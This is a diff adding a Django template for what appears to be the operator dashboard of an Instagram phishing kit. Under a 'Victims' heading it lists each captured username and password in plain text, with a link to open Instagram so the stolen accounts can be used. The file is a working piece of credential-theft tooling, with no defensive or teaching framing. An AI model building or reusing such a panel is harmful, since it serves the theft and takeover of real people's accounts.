@@ -1,0 +1,22 @@
+{% extends "base.html" %}
+{% block content %}
+{% load static %}
+    <section id="hacker">
+        <header>
+            <button class='toggle-reload'>Toggle Reload</button><button class='reload'>Reload</button><button class='open_instagram'>Open Instagram</button>
+        </header>
+        <section class="wrapper">
+            
+            <h1>Victims</h1>
+            <div class="victims">
+                {% for victim in victims %}
+                    <div class="victim">
+                        <h2>Username: <span>{{victim.username}}</span></h2>
+                        <p>Password: <span>{{victim.password}}</span></p>
+                        <a href="https://www.instagram.com/?hl=ha-ng" class="button">Open Instagram</a>
+                    </div>
+                {% endfor %}
+            </div>
+        </section>
+    </section>
+{% endblock %}
